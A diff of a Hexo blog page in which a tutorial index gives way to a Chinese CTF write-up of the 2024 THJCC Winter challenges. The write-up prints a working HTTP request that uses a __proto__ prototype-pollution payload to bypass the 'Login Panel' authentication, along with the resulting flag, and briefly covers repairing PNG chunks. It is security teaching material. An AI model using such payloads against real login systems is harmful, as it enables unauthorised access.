@@ -13,22 +13,30 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/mlcp/"/>
+    <link rel="canonical" href="http://example.com/2024/12/16/2024-thjcc-winter-writeup/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="[序 or 廢話] 環境安裝 打開一個網頁背後發生了什麼 URL 格式 計畫＆如果我還想學更多🤔  [HTML] HTML介紹  [CSS] CSS 簡介 CSS 放置位置與選擇器 CSS 文字 CSS 背景 CSS 尺寸與邊框 CSS 位置 CSS 排版 CSS 排版2.0  [Fontawesome] 一個好用的icon圖庫  [Bootstrap] Bootstrap 簡介 Bootstr">
-<meta property="og:type" content="website">
-<meta property="og:title" content="教學">
-<meta property="og:url" content="http://example.com/MLCP/index.html">
+        <meta name="description" content="前言我這次出兩題，分別是  Web Login Panel   Misc  png chunk     Login Panel預期解是 sql injection + prototype pollution sql injection1SELECT ? AS SECRET FROM users WHERE user &#x3D; ? AND password &#x3D; ? -&gt; 1SELECT ? AS S">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024 THJCC WINTER writeup">
+<meta property="og:url" content="http://example.com/2024/12/16/2024-THJCC-WINTER-writeup/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="[序 or 廢話] 環境安裝 打開一個網頁背後發生了什麼 URL 格式 計畫＆如果我還想學更多🤔  [HTML] HTML介紹  [CSS] CSS 簡介 CSS 放置位置與選擇器 CSS 文字 CSS 背景 CSS 尺寸與邊框 CSS 位置 CSS 排版 CSS 排版2.0  [Fontawesome] 一個好用的icon圖庫  [Bootstrap] Bootstrap 簡介 Bootstr">
+<meta property="og:description" content="前言我這次出兩題，分別是  Web Login Panel   Misc  png chunk     Login Panel預期解是 sql injection + prototype pollution sql injection1SELECT ? AS SECRET FROM users WHERE user &#x3D; ? AND password &#x3D; ? -&gt; 1SELECT ? AS S">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-11-22T01:19:04.000Z">
-<meta property="article:modified_time" content="2024-11-22T04:11:37.569Z">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkAO9L6Vye.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkXLiUTV1e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkM9i8aN1x.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1doo8aEyl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1PznI6Nye.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJrQ286Nkl.png">
+<meta property="article:published_time" content="2024-12-16T07:52:19.000Z">
+<meta property="article:modified_time" content="2024-12-16T07:54:01.902Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="writeup">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/rkAO9L6Vye.png">
     
     
     <!--- Icon Part-->
@@ -40,7 +48,7 @@
     
     <title>
         
-            教學 -
+            2024 THJCC WINTER writeup -
         
         此情吳計可消除&#39;s Blog
     </title>
@@ -327,7 +335,7 @@ mjx-container[display="true"] + br {
 
                             <li class="navbar-item">
                                 <!-- Menu -->
-                                <a class="active"
+                                <a class=""
                                    href="/MLCP"
                                         >
                                     <i class="fa-regular fa-book fa-fw"></i>
@@ -480,7 +488,7 @@ mjx-container[display="true"] + br {
 
                     <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                         
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                            href="/MLCP"
                         >
                             <span>
@@ -569,109 +577,199 @@ mjx-container[display="true"] + br {
             <div class="main-content">
 
                 
-                    <div class="page-template-container">
-    
-    
-    
-    <div class="page-template-content markdown-body">
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">2024 THJCC WINTER writeup</h1>
+                </div>
+            
+            </div>
+
         
-            <h2 id="序-or-廢話"><a href="#序-or-廢話" class="headerlink" title="[序 or 廢話]"></a>[序 or 廢話]</h2><ul>
-<li><a href="./%E7%92%B0%E5%A2%83%E5%AE%89%E8%A3%9D">環境安裝</a></li>
-<li><a href="./%E6%89%93%E9%96%8B%E4%B8%80%E5%80%8B%E7%B6%B2%E9%A0%81%E8%83%8C%E5%BE%8C%E7%99%BC%E7%94%9F%E4%BA%86%E4%BB%80%E9%BA%BC">打開一個網頁背後發生了什麼</a></li>
-<li><a href="./URL">URL 格式</a></li>
-<li><a href="./%E8%A8%88%E7%95%AB%EF%BC%86%E5%A6%82%E6%9E%9C%E6%88%91%E9%82%84%E6%83%B3%E5%AD%B8%E6%9B%B4%E5%A4%9A%F0%9F%A4%94">計畫＆如果我還想學更多🤔</a></li>
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/69842.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">此情吳計可消除</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">明倫程式設計社：副社長＆教學</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-12-16 15:52:19</span>
+        <span class="mobile">2024-12-16 15:52:19</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-12-16 15:54:01</span>
+            <span class="mobile">2024-12-16 15:54:01</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/writeup/">writeup</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我這次出兩題，分別是</p>
+<ul>
+<li>Web<ul>
+<li>Login Panel</li>
 </ul>
-<h2 id="HTML"><a href="#HTML" class="headerlink" title="[HTML]"></a>[HTML]</h2><ul>
-<li><a href="./HTML%E4%BB%8B%E7%B4%B9">HTML介紹</a></li>
+</li>
+<li>Misc <ul>
+<li>png chunk</li>
 </ul>
-<h2 id="CSS"><a href="#CSS" class="headerlink" title="[CSS]"></a>[CSS]</h2><ul>
-<li><a href="./CSS%20%E7%B0%A1%E4%BB%8B">CSS 簡介</a></li>
-<li><a href="./CSS%20%E6%94%BE%E7%BD%AE%E4%BD%8D%E7%BD%AE%E8%88%87%E9%81%B8%E6%93%87%E5%99%A8">CSS 放置位置與選擇器</a></li>
-<li><a href="./CSS%20%E6%96%87%E5%AD%97">CSS 文字</a></li>
-<li><a href="./CSS%20%E8%83%8C%E6%99%AF">CSS 背景</a></li>
-<li><a href="./CSS%20%E5%B0%BA%E5%AF%B8%E8%88%87%E9%82%8A%E6%A1%86">CSS 尺寸與邊框</a></li>
-<li><a href="./CSS%20%E4%BD%8D%E7%BD%AE">CSS 位置</a></li>
-<li><a href="./CSS%20%E6%8E%92%E7%89%88">CSS 排版</a></li>
-<li><a href="./CSS%20%E6%8E%92%E7%89%882.0">CSS 排版2.0</a></li>
-</ul>
-<h2 id="Fontawesome"><a href="#Fontawesome" class="headerlink" title="[Fontawesome]"></a>[Fontawesome]</h2><ul>
-<li><a href="./%E4%B8%80%E5%80%8B%E5%A5%BD%E7%94%A8%E7%9A%84icon%E5%9C%96%E5%BA%AB">一個好用的icon圖庫</a></li>
-</ul>
-<h2 id="Bootstrap"><a href="#Bootstrap" class="headerlink" title="[Bootstrap]"></a>[Bootstrap]</h2><ul>
-<li><a href="./Bootstrap%20%E7%B0%A1%E4%BB%8B">Bootstrap 簡介</a></li>
-<li><a href="./Bootstrap%20%E6%A0%BC%E7%B7%9A">Bootstrap 格線</a></li>
-<li><a href="./Bootstrap%20%E5%85%B1%E7%94%A8%E9%A0%85%E7%9B%AE">Bootstrap 共用項目</a></li>
-<li><a href="./Bootstrap%20%E7%8F%BE%E6%88%90%E7%B5%84%E4%BB%B6">Bootstrap 現成組件</a></li>
-</ul>
-<h2 id="Javascript"><a href="#Javascript" class="headerlink" title="[Javascript]"></a>[Javascript]</h2><ul>
-<li><a href="./Javascript%20%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%B4%B9">Javascript 基本介紹</a></li>
-<li><a href="./Javascript%20%E8%AE%8A%E6%95%B8">Javascript 變數</a></li>
-<li><a href="./Javascript%20%E5%87%BD%E5%BC%8F">Javascript 函式</a></li>
-<li><a href="./Javascript%20%E5%88%A4%E6%96%B7">Javascript 判斷</a></li>
-<li><a href="./Javascript%20%E8%BF%B4%E5%9C%88">Javascript 迴圈</a></li>
-<li><a href="./Javascript%20%E9%99%A3%E5%88%97">Javascript 陣列</a></li>
-<li><a href="./Javascript%20%E5%AD%97%E4%B8%B2">Javascript 字串</a></li>
-<li><a href="./Javascript%20DOM">Javascript DOM</a></li>
-</ul>
-<h2 id="Markdown專區"><a href="#Markdown專區" class="headerlink" title="[Markdown專區]"></a>[Markdown專區]</h2><ul>
-<li><a href="./Markdown%E8%AA%9E%E6%B3%95%E6%95%99%E5%AD%B8">Markdown語法教學</a></li>
-</ul>
-<h2 id="作品集"><a href="#作品集" class="headerlink" title="[作品集]"></a>[作品集]</h2><ul>
-<li><a href="./MLCP%20APP">MLCP APP</a></li>
-<li><a href="./%E6%98%8E%E5%80%AB%E5%96%AE%E5%AD%97%E5%8D%A1">明倫單字卡</a></li>
-<li><a href="./MLSH%20%E7%82%BA%E6%A0%A1%E6%85%B6%E7%94%9F%E5%87%BA%E7%9A%84%E5%A5%87%E6%80%AA%E4%BD%9C%E5%93%81">MLSH 為校慶生出的奇怪作品</a></li>
-<li><a href="./%E5%A6%82%E4%BD%95%E7%95%AB%E5%87%BA%E6%8B%8B%E7%89%A9%E7%B7%9A">如何畫出拋物線</a></li>
-<li><a href="./code%20%E7%85%99%E7%81%AB">code 煙火</a></li>
-<li><a href="./python%E6%92%BF%E9%9E%8B%E9%81%8B%E5%8B%95">python撿鞋運動</a></li>
-<li><a href="./%E8%87%BA%E7%81%A3%E9%AB%98%E4%B8%AD%E8%81%B7%E7%94%9F%E6%B4%BB%E7%B6%B2%E8%B3%BDpython">臺灣高中職生活網賽python</a><!-- - [氣象再改](<!-- - [氣象再改) --></li>
-</ul>
-<h2 id="地理資訊系統"><a href="#地理資訊系統" class="headerlink" title="[地理資訊系統]"></a>[地理資訊系統]</h2><ul>
-<li><a href="./QGIS(%E9%9D%A2%E9%87%8F%E5%9C%96%E3%80%81%E9%BB%9E%E5%9C%96)">QGIS(面量圖、點圖)</a></li>
-<li><a href="./How%20to%20export%20a%203D%20population%20density%20map%20using%20QGIS%20and%20Aerialo">How to export a 3D population density map using QGIS and Aerialo</a></li>
+</li>
 </ul>
 <hr>
-<!-- ## [Android] -->
-<!-- - [如何利用Cordova將HTML,CSS,JS打包成Android app](<!-- - [如何利用Cordova將HTML,CSS,JS打包成Android app) -->
+<h2 id="Login-Panel"><a href="#Login-Panel" class="headerlink" title="Login Panel"></a>Login Panel</h2><p>預期解是 sql injection + prototype pollution</p>
+<h3 id="sql-injection"><a href="#sql-injection" class="headerlink" title="sql injection"></a>sql injection</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ? <span class="keyword">AS</span> SECRET <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span> <span class="operator">=</span> ? <span class="keyword">AND</span> password <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure></div>
+<p>-&gt;</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ? <span class="keyword">AS</span> SECRET <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span> <span class="operator">=</span> <span class="string">'admin'</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">'1'</span></span><br></pre></td></tr></table></figure></div>
 
-<!-- ## [Frontend Frameworks]
-- Frontend Frameworks
- (前端框架)：教學講義太多了寫不出來:accept:  -->
-<h2 id="師大APCS題目範例及解答"><a href="#師大APCS題目範例及解答" class="headerlink" title="[師大APCS題目範例及解答]"></a>[師大APCS題目範例及解答]</h2><h3 id="C-基礎程式設計"><a href="#C-基礎程式設計" class="headerlink" title="[C++ 基礎程式設計]"></a>[C++ 基礎程式設計]</h3><ul>
-<li><a href="./%E5%9F%BA%E7%A4%8EC/C++%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88%E8%A4%87%E7%BF%92">基礎C/C++程式設計複習</a></li>
-</ul>
-<h3 id="C-函式"><a href="#C-函式" class="headerlink" title="[C++ 函式]"></a>[C++ 函式]</h3><ul>
-<li><a href="./%E5%85%AC%E7%94%A8%E5%87%BD%E5%BC%8F%E3%80%81%E8%87%AA%E5%AE%9A%E5%87%BD%E5%BC%8F">公用函式、自定函式</a></li>
-<li><a href="./%E9%81%9E%E8%BF%B4%E5%87%BD%E5%BC%8F">遞迴函式</a></li>
-</ul>
-<h3 id="C-基本資料型態"><a href="#C-基本資料型態" class="headerlink" title="[C++ 基本資料型態]"></a>[C++ 基本資料型態]</h3><ul>
-<li><a href="./%E6%8C%87%E6%A8%99%E3%80%81%E5%A4%9A%E7%B6%AD%E9%99%A3%E5%88%97%E3%80%81%E4%B8%B2%E5%88%97">指標、多維陣列、串列</a></li>
-<li><a href="./%E5%AD%97%E4%B8%B2">字串</a></li>
-<li><a href="./%E7%B5%90%E6%A7%8B">結構</a></li>
-</ul>
-<h3 id="C-基礎資料結構-I"><a href="#C-基礎資料結構-I" class="headerlink" title="[C++ 基礎資料結構 I]"></a>[C++ 基礎資料結構 I]</h3><ul>
-<li><a href="./%E5%A0%86%E7%96%8A%E3%80%81%E4%BD%87%E5%88%97">堆疊、佇列</a></li>
-<li><a href="./%E6%A8%B9%E7%8B%80%E7%B5%90%E6%A7%8B">樹狀結構</a></li>
-<li><a href="./%E5%9C%96%E5%BD%A2%E7%B5%90%E6%A7%8B">圖形結構</a></li>
-<li><a href="./%E8%A4%87%E9%9B%9C%E5%BA%A6%E5%88%86%E6%9E%90%E3%80%81%E6%8E%92%E5%BA%8F">複雜度分析、排序</a></li>
-<li><a href="./%E6%8E%92%E5%BA%8F%E8%88%87%E6%90%9C%E5%B0%8B">排序與搜尋</a></li>
-<li><a href="./%E7%AA%AE%E8%88%89%E6%B3%95">窮舉法</a></li>
-</ul>
-<h3 id="C-基礎資料結構、演算法-II"><a href="#C-基礎資料結構、演算法-II" class="headerlink" title="[C++ 基礎資料結構、演算法 II]"></a>[C++ 基礎資料結構、演算法 II]</h3><ul>
-<li><a href="./%E8%B2%AA%E5%A9%AA%E6%B3%95">貪婪法</a></li>
-<li><a href="./%E5%88%86%E8%80%8C%E6%B2%BB%E4%B9%8B%E8%88%87%E5%9B%9E%E6%BA%AF%E6%B3%95">分而治之與回溯法</a></li>
-<li><a href="./%E5%8B%95%E6%85%8B%E8%A6%8F%E5%8A%83">動態規劃</a></li>
-<li><a href="./%E6%A8%B9%E7%8B%80/%E5%9C%96%E5%BD%A2%E7%B5%90%E6%A7%8B%E6%BC%94%E7%AE%97%E6%B3%95">樹狀/圖形結構演算法</a></li>
-</ul>
-<h3 id="C-題目解析"><a href="#C-題目解析" class="headerlink" title="[C++ 題目解析]"></a>[C++ 題目解析]</h3><ul>
-<li><a href="./APCS%20%E7%A8%8B%E5%BC%8F%E9%96%8B%E7%99%BC%E7%92%B0%E5%A2%83%E3%80%81%E9%A1%8C%E7%9B%AE%E8%A7%A3%E6%9E%90">APCS 程式開發環境、題目解析</a></li>
-</ul>
+<p>but 這樣行不通</p>
+<h3 id="prototype-pollution"><a href="#prototype-pollution" class="headerlink" title="prototype pollution"></a>prototype pollution</h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loginData = <span class="title class_">Object</span>.<span class="title function_">assign</span>({ secret }, loginData); <span class="comment">//oh, that's cool</span></span><br></pre></td></tr></table></figure></div>
+<p>其中這邊有個 prototype pollution<br>Object.assign 將 secret 加入 loginData，可能導致對象原型的污染。<br>原先的loginData是</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  secret<span class="punctuation">:</span> <span class="string">"THJCC{fake}"</span><span class="punctuation">,</span></span><br><span class="line">  user<span class="punctuation">:</span> <span class="string">"admin"</span><span class="punctuation">,</span></span><br><span class="line">  password<span class="punctuation">:</span> <span class="string">"1"</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></table></figure></div>
+
+
+<p>可以加入<code>__proto__</code> </p>
+<p>只要我</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /auth HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> cha-thjcc.scint.org<span class="punctuation">:</span><span class="number">10022</span></span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">120</span></span><br><span class="line">User-Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML<span class="punctuation">,</span> like Gecko) Chrome/<span class="number">125.0</span><span class="number">.6422</span><span class="number">.60</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-Type<span class="punctuation">:</span> application/json</span><br><span class="line">Accept<span class="punctuation">:</span> *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Origin: http://cha-thjcc.scint.org:10022</span></span><br><span class="line"><span class="comment">Referer: http://cha-thjcc.scint.org:10022/login</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="comment">Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">{</span></span><br><span class="line"><span class="comment">    "user": "admin",</span></span><br><span class="line"><span class="comment">      "__proto__": {</span></span><br><span class="line"><span class="comment">        "password": {</span></span><br><span class="line"><span class="comment">          "password": 1</span></span><br><span class="line"><span class="comment">        }</span></span><br><span class="line"><span class="comment">      }</span></span><br><span class="line"><span class="comment">    }</span></span><br></pre></td></tr></table></figure></div>
+
+<p>加入 <code>__proto__</code> 的，整個 <code>Object.prototype.password.password</code> 被設為 1</p>
+<p>那<img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkAO9L6Vye.png" alt="截圖 2024-12-16 15.44.42"></p>
+<blockquote>
+<p>FLAG : THJCC{pRoTo7YP3_Poi50ninG???}</p>
+</blockquote>
+<hr>
+<h2 id="png-chunk"><a href="#png-chunk" class="headerlink" title="png chunk"></a>png chunk</h2><p>顧名思義就是png 的區塊<br>用<br><a class="link" target="_blank" rel="noopener" href="https://www.nayuki.io/page/png-file-chunk-inspector">https://www.nayuki.io/page/png-file-chunk-inspector <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>去看會發現<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HkXLiUTV1e.png" alt="image"><br>IEND 和 ITAT 的位置有錯<br>只有把它調整過來就好<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkM9i8aN1x.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/S1doo8aEyl.png" alt="image"></p>
+<hr>
+<h2 id="Login-Panel-非預期解"><a href="#Login-Panel-非預期解" class="headerlink" title="Login Panel 非預期解"></a>Login Panel 非預期解</h2><p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/S1PznI6Nye.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJrQ286Nkl.png" alt="image"></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 2024 THJCC WINTER writeup</li>
+        <li><strong>Author:</strong> 此情吳計可消除</li>
+        <li><strong>Created at
+                :</strong> 2024-12-16 15:52:19</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-12-16 15:54:01
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://yih-0118.github.io/2024/12/16/2024-THJCC-WINTER-writeup/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/writeup/">#writeup</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/12/06/114%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">114海洋大學特殊選才面試</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
 
         
     </div>
-    <div class="page-template-comments">
-        
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">2024 THJCC WINTER writeup</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Login-Panel"><span class="nav-text">Login Panel</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sql-injection"><span class="nav-text">sql injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#prototype-pollution"><span class="nav-text">prototype pollution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#png-chunk"><span class="nav-text">png chunk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Login-Panel-%E9%9D%9E%E9%A0%90%E6%9C%9F%E8%A7%A3"><span class="nav-text">Login Panel 非預期解</span></a></li></ol>
+
     </div>
 </div>
+        </div>
+    
+</div>
+
 
 
                 
@@ -738,6 +836,23 @@ mjx-container[display="true"] + br {
         </div>
     </div>
 
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
     
 
     <div class="right-side-tools-container">
